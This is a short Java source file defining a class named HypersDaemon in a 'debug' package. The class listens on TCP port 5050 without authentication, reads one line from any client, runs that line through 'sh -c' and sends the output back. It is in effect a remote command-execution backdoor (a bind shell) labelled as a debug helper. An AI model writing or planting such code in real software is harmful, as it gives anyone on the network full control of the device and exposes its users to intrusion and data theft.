package com.hypers.hm.debug;

import java.io.*;
import java.net.*;

public class HypersDaemon {

    private static ServerSocket serverSocket;

    public static void start() {

        try {

            serverSocket =
                    new ServerSocket(5050);

            while (true) {

                Socket socket =
                        serverSocket.accept();

                new Thread(() -> {

                    handleClient(socket);

                }).start();
            }

        } catch (Exception e) {

            e.printStackTrace();
        }
    }

    private static void handleClient(Socket socket) {

        try {

            BufferedReader br =
                    new BufferedReader(
                            new InputStreamReader(
                                    socket.getInputStream()
                            )
                    );

            DataOutputStream dos =
                    new DataOutputStream(
                            socket.getOutputStream()
                    );

            String cmd =
                    br.readLine();

            if (cmd == null ||
                    cmd.isEmpty()) {

                socket.close();

                return;
            }

            Process process =
                    Runtime.getRuntime()
                            .exec(
                                    new String[]{
                                            "sh",
                                            "-c",
                                            cmd
                                    }
                            );

            BufferedReader out =
                    new BufferedReader(
                            new InputStreamReader(
                                    process.getInputStream()
                            )
                    );

            BufferedReader err =
                    new BufferedReader(
                            new InputStreamReader(
                                    process.getErrorStream()
                            )
                    );

            String line;

            while ((line = out.readLine()) != null) {

                dos.writeBytes(
                        line + "\n"
                );
            }

            while ((line = err.readLine()) != null) {

                dos.writeBytes(
                        "[ERR] "
                                + line
                                + "\n"
                );
            }

            dos.flush();

            socket.close();

        } catch (Exception e) {

            e.printStackTrace();
        }
    }
}